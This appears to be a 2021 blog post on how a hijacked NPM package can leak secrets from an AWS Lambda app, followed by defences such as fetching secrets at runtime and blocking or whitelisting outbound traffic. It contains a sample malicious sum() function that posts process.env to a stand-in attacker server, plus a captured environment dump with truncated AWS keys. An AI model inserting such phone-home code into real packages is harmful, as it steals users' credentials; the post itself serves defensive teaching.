---
title: "How a compromised NPM package can steal your secrets (POC + prevention)"
image: /posts/2021/04/how-compromised-npm-package-can-steal-your-secrets/thumb.png
image_dev: /posts/2021/04/how-compromised-npm-package-can-steal-your-secrets/thumb-dev.png
description: POC of a vulnerable AWS Lambda app leaking environment variables via a compromised NPM package
date: 2021-04-17
tags:
  - AWS
  - AWS Lambda
  - VPC
  - Security
  - NPM
  - Node.js
  - Terraform
---

Any decently sized Node.js project depends on multiple **3rd party NPM packages**. In turn, each of those may have dependencies as well. Which leaves you with a **ton of code** that you didn't write, that you don't control and don't have much visibility over during package updates. It may take one compromised package in that dependency graph to **steal secrets** from your production environment. The package may appear to be vulnerable to [code injection](https://owasp.org/www-community/attacks/Code_Injection) or it may get hacked resulting in malicious code added to the package's source code. It happened [before](https://techbeacon.com/security/check-your-dependencies-githubs-npm-finds-nasty-trojan-packages) and [not once](https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/), and surely we will see similar incidents in the future.

If such a compromised package gets deployed to the production servers, it may run the attacker's supplied malicious code at some point. One thing that the code can do is collect the information about the **environment** and send it to the attacker's owned endpoint. In this post we will go over an example of such (manually crafted) compromised package to see how it can be exploited. The environment we will use is Node.js running in AWS Lambda, but the technique applies to other languages and cloud providers as well.

Finally we will see how to make it harder to exploit this type of vulnerability and how to **prevent** it completely (the cost here is added configuration complexity).

You can find all of the examples in the [article repository](https://github.com/maximivanov/nodejs-leak-env-vars), each example contains a snippet of code and Terraform scripts to deploy it to AWS.

## Compromised package

Imagine your application uses an external package. Let's say it's a super complex implementation of a `sum(a, b)` function - naive but sufficient for the demo purposes:

```js
async function sum(a, b) {
  return a + b
}

module.exports = {
  sum,
}
```

The package got hacked. Maybe author's NPM credentials were stolen and new version of the package containing **malicous code was published**:

```js
const phoneHomeUrl = 'https://attacker-owned-server'

async function sum(a, b) {
  await post(phoneHomeUrl, process.env)

  return originalSum(a, b)
}

async function originalSum(a, b) {
  return a + b
}

async function post(url, data) {
  ...
}

module.exports = {
  sum,
}
```

In addition to performing the calculations the package was already doing, the code was added to post the **environment variables** to the attacker's server. Normally if you install the compromised package, you wouldn't even know it's phoning home since it still performs its function.

[Source for the compromised package](https://github.com/maximivanov/nodejs-leak-env-vars/tree/master/compromised-npm-package).

## Phone-home listener

I've implemented the collecting endpoint with AWS Lambda. It simply dumps all incoming request details to Cloudwatch, where we can inspect them later.

```js
exports.handler = async (event) => {
  console.log('Got call home! Event: ', event)

  const response = {
    status: 'OK',
  }

  return response
}
```

[Source for the phone home listener](https://github.com/maximivanov/nodejs-leak-env-vars/tree/master/phone-home-listener).

## Vulnerable app example

Now here's our vulnerable app that uses the compromised package. Again, it's a Lambda function that generates two random numbers and calls the package's sum to get the result, which is returned to the function caller.

The function uses a secret `MY_SECRET`, which could be a connection string for the database defined as an environment variable in plain text.

```js
const { sum } = require('compromised-npm-package')

exports.handler = async () => {
  const secretFromEnv = process.env.MY_SECRET

  // use the secret somehow... we'll just log it
  console.log('secretFromEnv', secretFromEnv)

  const a = randomInteger(1, 100)
  const b = randomInteger(1, 100)
  const result = await sum(a, b)

  const response = {
    a,
    b,
    result,
  }

  return response
}

function randomInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}
```

If we invoke this function through the AWS CLI:

```bash
root@bf12d39e866c:/var/app/vulnerable-app# aws lambda invoke --function-name leak-env-vars-poc-lambda-function out.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

It will call the compromised package's `sum()` function which in turn will send `process.env` to the catch-all HTTP endpoint. Looking at the Cloudwatch logs of the listener function we will see the secret from the vulnerable function:

![plain text env captured](/posts/2021/04/how-compromised-npm-package-can-steal-your-secrets/plain-text-env-captured.webp)

But not only that! In fact it captures the **temporary AWS credentials** of the Lambda function as well. If you're curious how the **full dump of Node.js environment variables** looks like:

```json
{
  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
  "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEKD//////////wEaCXVzLWVhc3QtMSJIMEYCIQCKn...",
  "LAMBDA_TASK_ROOT": "/var/task",
  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/leak-env-vars-poc-lambda-function",
  "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
  "AWS_LAMBDA_LOG_STREAM_NAME": "2021/04/14/[$LATEST]629e422565134af5ae33e69a125a2d41",
  "AWS_LAMBDA_RUNTIME_API": "127.0.0.1:9001",
  "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs14.x",
  "AWS_LAMBDA_FUNCTION_NAME": "leak-env-vars-poc-lambda-function",
  "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2:2000",
  "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
  "MY_SECRET": "this is my secret value",
  "AWS_DEFAULT_REGION": "us-east-1",
  "PWD": "/var/task",
  "AWS_SECRET_ACCESS_KEY": "9g484jcds9gQcpt6N4QnRj4v4mj8r...",
  "LAMBDA_RUNTIME_DIR": "/var/runtime",
  "LANG": "en_US.UTF-8",
  "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
  "NODE_PATH": "/opt/nodejs/node14/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task",
  "AWS_REGION": "us-east-1",
  "TZ": ":UTC",
  "AWS_ACCESS_KEY_ID": "ASIARV6QASLKD...",
  "SHLVL": "0",
  "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.2",
  "_AWS_XRAY_DAEMON_PORT": "2000",
  "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
  "_HANDLER": "index.handler",
  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
  "_X_AMZN_TRACE_ID": "Root=1-60777b72-13a6527d3ff1094a29ae72ca;Parent=77ee64a10c682226;Sampled=0"
}
```

## Prevention: fetch secrets at runtime

One rather simple way to prevent leakage of secrets is to **not store them in plain text** in environment variables. Rather keep them in AWS [Parameter Store](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html) (free, limited scaling) or [Secrets Manager](https://aws.amazon.com/secrets-manager/) (pay per secret/month + per every 10k calls). The application would then read the secret value **at runtime and keep it in memory** for future reuse. Here's how the previous vulnerable example can be adapted:

```js
const { sum } = require('compromised-npm-package')
const AWS = require('aws-sdk')

exports.handler = async () => {
  const secretFromSsm = await fetchSecret(process.env.MY_SECRET_NAME)

  // use the secret somehow... we'll just log it
  console.log('secretFromSsm', secretFromSsm)

  const a = randomInteger(1, 100)
  const b = randomInteger(1, 100)
  const result = await sum(a, b)

  const response = {
    a,
    b,
    result,
  }

  return response
}

function randomInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

async function fetchSecret(name) {
  const ssm = new AWS.SSM({ region: 'us-east-1' })

  const options = {
    Name: name,
    WithDecryption: true,
  }

  const data = await ssm.getParameter(options).promise()

  return data
}
```

When running the app, it will still post the environment variables to the attacker's server, but it **won't include user-provided secrets** anymore. It will still include temporary AWS credentials though, so the attacker could use those to fetch the secret from the Parameter Store directly (considering they know the name of the parameter).

What about the **exposed AWS credentials**? True, anyone who has them can assume the **associated IAM role** and access the AWS resources. That's why it's critical to always grant only the **minimum required permissions** to the application IAM roles.

Source code for the upgraded app + Terraform resources to create SSM parameter and grant Lambda access to the parameter: [poc repository](https://github.com/maximivanov/nodejs-leak-env-vars/tree/master/leak-env-vars-poc-fetch-secrets-runtime).

## Prevention: block outbound connections

If your application does not need to access the internet, you can **block outbound connections** altogether. For that you need to put the Lambda in a virtual network (VPC) which has no route out by default.

Application code will not change. Here are the changes you need to make to the infrastructure. Create a VPC, a private subnet and explicitly define a security group. Security group does not have any outbound rules, but even if it did, there's no Internet Gateway associated with the VPC which effectively **disables all egress connections**.

```hcl
...

resource "aws_vpc" "vpc" {
  cidr_block = var.vpc_cidr_block
  tags = {
    Name = "${var.project}-vpc"
  }
}

resource "aws_subnet" "subnet_private" {
  vpc_id                  = aws_vpc.vpc.id
  cidr_block              = var.subnet_private_cidr_block
  map_public_ip_on_launch = false
  tags = {
    Name = "${var.project}-subnet-private"
  }
}

resource "aws_default_security_group" "default_security_group" {
  vpc_id = aws_vpc.vpc.id

  ingress {
    protocol  = -1
    self      = true
    from_port = 0
    to_port   = 0
  }

  tags = {
    Name = "${var.project}-default-security-group"
  }
}
```

Associate the Lambda with the subnet and security group:

```hcl
...

resource "aws_lambda_function" "lambda_function" {
  ...

  vpc_config {
    subnet_ids         = [aws_subnet.subnet_private.id]
    security_group_ids = [aws_default_security_group.default_security_group.id]
  }
}
```

With infra changes applied, if you try to run the application it will simply time out at Lambda's **configured max execution time**, while the malicous code is helplessly waiting to send the environment vars out.

```bash
root@bf12d39e866c:/var/app/leak-env-vars-poc-outbound-blocked/terraform# aws lambda invoke --function-name leak-env-vars-poc-outbound-blocked-lambda-function out.txt
{
    "StatusCode": 200,
    "FunctionError": "Unhandled",
    "ExecutedVersion": "$LATEST"
}

root@bf12d39e866c:/var/app/leak-env-vars-poc-outbound-blocked/terraform# cat out.txt
{"errorMessage":"2021-04-15T21:25:23.784Z 83617d65-31d1-4806-83b0-b5ec75be0e3f Task timed out after 5.01 seconds"}
```

The secrets won't be leaked. But it also means your app will stop working before you **remove the malicous code** blocking execution.

Code for the [blocked outbound connections](https://github.com/maximivanov/nodejs-leak-env-vars/tree/master/leak-env-vars-poc-outbound-blocked) example.

## Prevention: whitelist outbound connections

But what if your function does make **requests to the Internet**? You can **whitelist** the allowed destinations in the security group rules. 

Let's say our app depends on this [legitimate API](https://api.chucknorris.io/):

```js
const { sum } = require('compromised-npm-package')
const https = require('https')

exports.handler = async () => {
  const secretFromEnv = process.env.MY_SECRET

  // use the secret somehow... we'll just log it
  console.log('secretFromEnv', secretFromEnv)

  const randomFactRaw = await fetch('https://api.chucknorris.io/jokes/random')
  const randomFact = JSON.parse(randomFactRaw).value
  console.log('randomFact', randomFact)

  const a = randomInteger(1, 100)
  const b = randomInteger(1, 100)
  const result = await sum(a, b)

  const response = {
    a,
    b,
    result,
    randomFact,
  }

  return response
}

async function fetch(url) {
  ...
}
```

Let's find out the **IP addresses** of the API:

![chuck norris api ip](/posts/2021/04/how-compromised-npm-package-can-steal-your-secrets/host-chuck-norris-api.webp)

And whitelist them in the security group:

```hcl
...

resource "aws_default_security_group" "default_security_group" {
  vpc_id = aws_vpc.vpc.id

  ingress {
    protocol  = -1
    self      = true
    from_port = 0
    to_port   = 0
  }

  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["104.21.4.135/32", "172.67.132.31/32"]
  }

  tags = {
    Name = "${var.project}-default-security-group"
  }
}
```

To enable outbound network access for the Lambda, a number of resources will need to be added: Internet Gateway, NAT Gateway, route tables. This is out of the scope of this post, and you may want to check [Deploy AWS Lambda to VPC with Terraform](https://www.maxivanov.io/deploy-aws-lambda-to-vpc-with-terraform/).

With app code updated and network resources deployed, if we invoke the application function it will still hang (since the malicous code blocks) but from the logs we can see that the request to the **whitelisted API succeeded**:

![outbound whitelisted worked](/posts/2021/04/how-compromised-npm-package-can-steal-your-secrets/outbound-whitelisted-worked.webp)

Full code for the [whitelisted destinations](https://github.com/maximivanov/nodejs-leak-env-vars/tree/master/leak-env-vars-poc-outbound-whitelisted) app.

## References

- https://techbeacon.com/security/check-your-dependencies-githubs-npm-finds-nasty-trojan-packages
- https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/
- https://owasp.org/www-community/attacks/Code_Injection
- https://api.chucknorris.io/
- https://www.maxivanov.io/deploy-aws-lambda-to-vpc-with-terraform/
- https://github.com/maximivanov/nodejs-leak-env-vars

## ...

To summarize, keep your applications safe: 

- apply **least privilege principle** when granting IAM permissions
- do not store secrets in **plain text** in environment variables
- **block or whitelist** inbound and outbound network access
- analyze npm dependencies for **known vulnerabilities** with `npm audit` and tools like [snyk](https://support.snyk.io/hc/en-us/articles/360004712477-Snyk-for-JavaScript) before they find their way to your servers